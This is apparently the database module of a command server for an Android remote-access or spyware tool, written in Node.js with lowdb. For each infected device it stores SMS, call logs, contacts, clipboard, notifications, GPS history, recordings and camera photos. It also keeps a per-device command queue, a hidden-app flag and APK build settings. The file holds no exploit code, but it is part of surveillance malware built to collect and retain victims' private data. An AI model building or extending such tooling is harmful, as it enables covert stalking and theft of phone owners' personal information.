const fs = require('fs');
const path = require('path');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const config = require('../config/config');
const { ensureDir } = require('../utils/ensureDir');

// Simple logger (can't use main logger here)
const log = (type, msg) => console.log(`[${new Date().toISOString()}] [${type}] ${msg}`);

// Initialize directories
const initDirs = () => {
    const dirs = [
        config.dbPath,
        config.downloadsPath,
        config.photosPath,
        config.recordingsPath,
        config.build.decompilePath,
        config.getBuiltApkPath(),
        path.join(config.dbPath, 'clients'),
        path.join(config.dbPath, 'backups')
    ];
    dirs.forEach(dir => {
        ensureDir(dir);
        log('INFO', `Ensured directory: ${dir}`);
    });
};

initDirs();

// Main database
const mainPath = path.join(config.dbPath, 'main.json');
const main = low(new FileSync(mainPath));

main.defaults({
    users: [],
    sessions: [],
    clients: [],
    settings: {
        serverStart: new Date().toISOString(),
        version: '2.2.2',
        maxClients: 500,
        maxDownloads: 100,
        maxPhotos: 100
    },
    build: {
        serverUrl: '',
        homePageUrl: '',
        lastBuild: null,
        buildCount: 0
    }
}).write();

log('INFO', 'Main database initialized');

// Client database cache
const clientDbs = {};

// Default client schema
const defaultSchema = (id) => ({
    id,
    queue: [],
    sms: [],
    calls: [],
    contacts: [],
    wifi: [],
    clipboard: [],
    notifications: [],
    permissions: [],
    apps: [],
    gps: [],
    gpsInterval: 0,
    downloads: [],
    recordings: [],
    files: [],
    currentPath: '',
    cameras: [],
    photos: [],
    cameraPermission: false,
    deviceInfo: null,
    fasonHidden: false,
    lastUpdated: new Date().toISOString()
});

// Get or create client database
const client = (id) => {
    if (!id || typeof id !== 'string') return null;
    if (clientDbs[id]) return clientDbs[id];

    try {
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        const db = low(new FileSync(file));
        db.defaults(defaultSchema(id)).write();
        db.set('lastUpdated', new Date().toISOString()).write();
        clientDbs[id] = db;
        return db;
    } catch (e) {
        log('ERROR', `Failed to create client database: ${e.message}`);
        return null;
    }
};

// Get all client IDs
const getClientIds = () => {
    try {
        const dir = path.join(config.dbPath, 'clients');
        if (!fs.existsSync(dir)) return [];
        return fs.readdirSync(dir)
            .filter(f => f.endsWith('.json'))
            .map(f => f.replace('.json', ''));
    } catch (e) {
        return [];
    }
};

// Check if client exists
const clientExists = (id) => {
    return fs.existsSync(path.join(config.dbPath, 'clients', `${id}.json`));
};

// Delete client
const deleteClient = (id) => {
    try {
        main.get('clients').remove({ id }).write();
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        if (fs.existsSync(file)) fs.unlinkSync(file);
        delete clientDbs[id];
        cleanClientFiles(id);
        return true;
    } catch (e) {
        return false;
    }
};

// Clear client data
const clearClientData = (id) => {
    try {
        const cdb = client(id);
        if (!cdb) return false;
        cdb.assign(defaultSchema(id)).write();
        return true;
    } catch (e) {
        return false;
    }
};

// Clean client files
const cleanClientFiles = (id) => {
    try {
        [config.downloadsPath, config.photosPath, config.recordingsPath].forEach(dir => {
            if (fs.existsSync(dir)) {
                fs.readdirSync(dir)
                    .filter(f => f.startsWith(id))
                    .forEach(f => {
                        try { fs.unlinkSync(path.join(dir, f)); } catch (e) {}
                    });
            }
        });
    } catch (e) {}
};

// Trim client data
const trimClientData = (id) => {
    try {
        const cdb = client(id);
        if (!cdb) return false;

        const { maxGpsHistory, maxNotifications, maxClipboardHistory, maxDownloads, maxPhotos, maxRecordings, maxSmsHistory, maxCallsHistory } = config.limits;

        // Trim arrays
        const trim = (key, max) => {
            const arr = cdb.get(key).value() || [];
            if (arr.length > max) {
                cdb.set(key, arr.slice(-max)).write();
            }
        };

        trim('gps', maxGpsHistory);
        trim('notifications', maxNotifications);
        trim('clipboard', maxClipboardHistory);
        trim('sms', maxSmsHistory);
        trim('calls', maxCallsHistory);

        // Trim downloads with file cleanup
        const downloads = cdb.get('downloads').value() || [];
        if (downloads.length > maxDownloads) {
            downloads.slice(0, downloads.length - maxDownloads).forEach(item => {
                try {
                    const fp = path.join(config.downloadsPath, path.basename(item.file));
                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
                } catch (e) {}
            });
            cdb.set('downloads', downloads.slice(-maxDownloads)).write();
        }

        // Trim photos with file cleanup
        const photos = cdb.get('photos').value() || [];
        if (photos.length > maxPhotos) {
            photos.slice(0, photos.length - maxPhotos).forEach(item => {
                try {
                    const fp = path.join(config.photosPath, path.basename(item.file));
                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
                } catch (e) {}
            });
            cdb.set('photos', photos.slice(-maxPhotos)).write();
        }

        // Trim recordings with file cleanup
        const recordings = cdb.get('recordings').value() || [];
        if (recordings.length > maxRecordings) {
            recordings.slice(0, recordings.length - maxRecordings).forEach(item => {
                try {
                    const fp = path.join(config.recordingsPath, path.basename(item.file));
                    if (fs.existsSync(fp)) fs.unlinkSync(fp);
                } catch (e) {}
            });
            cdb.set('recordings', recordings.slice(-maxRecordings)).write();
        }

        return true;
    } catch (e) {
        return false;
    }
};

// Get database stats
const getStats = () => {
    try {
        const clientIds = getClientIds();
        let totalSize = 0;
        let clientSize = 0;
        let downloadsSize = 0;
        let photosSize = 0;

        // Main db size
        const mainFile = path.join(config.dbPath, 'main.json');
        if (fs.existsSync(mainFile)) totalSize += fs.statSync(mainFile).size;

        // Logs db size
        const logsFile = path.join(config.dbPath, 'logs.json');
        if (fs.existsSync(logsFile)) totalSize += fs.statSync(logsFile).size;

        // Client dbs size
        clientIds.forEach(id => {
            const file = path.join(config.dbPath, 'clients', `${id}.json`);
            if (fs.existsSync(file)) {
                const size = fs.statSync(file).size;
                totalSize += size;
                clientSize += size;
            }
        });

        // Downloads size
        if (fs.existsSync(config.downloadsPath)) {
            fs.readdirSync(config.downloadsPath).forEach(f => {
                try { downloadsSize += fs.statSync(path.join(config.downloadsPath, f)).size; } catch (e) {}
            });
        }

        // Photos size
        if (fs.existsSync(config.photosPath)) {
            fs.readdirSync(config.photosPath).forEach(f => {
                try { photosSize += fs.statSync(path.join(config.photosPath, f)).size; } catch (e) {}
            });
        }

        return {
            clientCount: clientIds.length,
            dbSize: totalSize,
            clientDbSize: clientSize,
            downloadsSize,
            photosSize,
            totalSize: totalSize + downloadsSize + photosSize
        };
    } catch (e) {
        return { error: e.message };
    }
};

// Backup database
const backup = (backupPath) => {
    try {
        const dir = backupPath || path.join(config.dbPath, 'backups', `backup-${Date.now()}`);
        ensureDir(dir);

        // Copy main and logs
        ['main.json', 'logs.json'].forEach(f => {
            const src = path.join(config.dbPath, f);
            if (fs.existsSync(src)) fs.copyFileSync(src, path.join(dir, f));
        });

        // Copy client dbs
        const clientsDir = path.join(config.dbPath, 'clients');
        const backupClientsDir = path.join(dir, 'clients');
        ensureDir(backupClientsDir);

        if (fs.existsSync(clientsDir)) {
            fs.readdirSync(clientsDir)
                .filter(f => f.endsWith('.json'))
                .forEach(f => fs.copyFileSync(path.join(clientsDir, f), path.join(backupClientsDir, f)));
        }

        log('INFO', `Backup created: ${dir}`);
        return { success: true, path: dir };
    } catch (e) {
        log('ERROR', `Backup failed: ${e.message}`);
        return { success: false, error: e.message };
    }
};

// Cleanup old backups
const cleanupBackups = () => {
    try {
        const dir = path.join(config.dbPath, 'backups');
        if (!fs.existsSync(dir)) return;

        fs.readdirSync(dir)
            .filter(f => f.startsWith('backup-'))
            .sort()
            .reverse()
            .slice(10)
            .forEach(f => {
                try { fs.rmSync(path.join(dir, f), { recursive: true, force: true }); } catch (e) {}
            });
    } catch (e) {}
};

module.exports = {
    main,
    client,
    getClientIds,
    clientExists,
    deleteClient,
    clearClientData,
    trimClientData,
    getStats,
    backup,
    cleanupBackups,
    initDirs
};

